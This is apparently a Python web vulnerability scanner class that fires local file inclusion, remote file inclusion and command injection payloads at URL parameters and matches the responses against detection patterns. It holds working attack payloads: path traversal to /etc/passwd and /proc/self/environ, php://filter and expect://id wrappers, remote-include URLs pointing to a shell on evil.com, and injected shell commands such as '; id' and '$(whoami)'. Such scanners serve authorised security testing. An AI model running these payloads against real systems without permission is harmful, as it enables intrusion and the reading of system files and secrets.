
import requests
import re
import os
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style

class BasicScanners:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def lfi_scanner(self, url, params=None):
        vulnerabilities = []
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://id",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for LFI vulnerabilities...{Style.RESET_ALL}")
        
        lfi_patterns = [
            r"root:.*:0:0:",
            r"daemon:.*:",
            r"# localhost",
            r"127\.0\.0\.1",
            r"<\?php",
            r"uid=\d+\(.*?\) gid=\d+\(.*?\)",
            r"Linux version",
            r"Microsoft Windows"
        ]
        
        for payload in lfi_payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        for pattern in lfi_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'LFI (Local File Inclusion)',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': pattern
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}LFI vulnerability found: {param} = {payload}{Style.RESET_ALL}")
                                break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def rfi_scanner(self, url, params=None):
        vulnerabilities = []
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/test",
            "ftp://evil.com/shell.php",
            "http://127.0.0.1/test.txt"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for RFI vulnerabilities...{Style.RESET_ALL}")
        
        for payload in rfi_payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        if "Connection refused" in response.text or "failed to open stream" in response.text:
                            vuln = {
                                'type': 'RFI (Remote File Inclusion)',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Remote file inclusion attempt detected'
                            }
                            vulnerabilities.append(vuln)
                            print(f"{Fore.RED}RFI vulnerability found: {param} = {payload}{Style.RESET_ALL}")
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def command_injection_scanner(self, url, params=None):
        vulnerabilities = []
        cmd_payloads = [
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; ls",
            "| ls",
            "& ls",
            "`ls`",
            "$(ls)"
        ]
        
        print(f"{Fore.YELLOW}Scanning {url} for Command Injection...{Style.RESET_ALL}")
        
        cmd_patterns = [
            r"uid=\d+\(.*?\) gid=\d+\(.*?\)",
            r"root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody",
            r"total \d+",
            r"drwx",
            r"-rw-",
            r"Administrator|SYSTEM|Users"
        ]
        
        for payload in cmd_payloads:
            try:
                if params:
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = self.session.get(url, params=test_params)
                        
                        for pattern in cmd_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln = {
                                    'type': 'Command Injection',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': pattern
                                }
                                vulnerabilities.append(vuln)
                                print(f"{Fore.RED}Command Injection found: {param} = {payload}{Style.RESET_ALL}")
                                break
            
            except Exception as e:
                continue
        
        return vulnerabilities
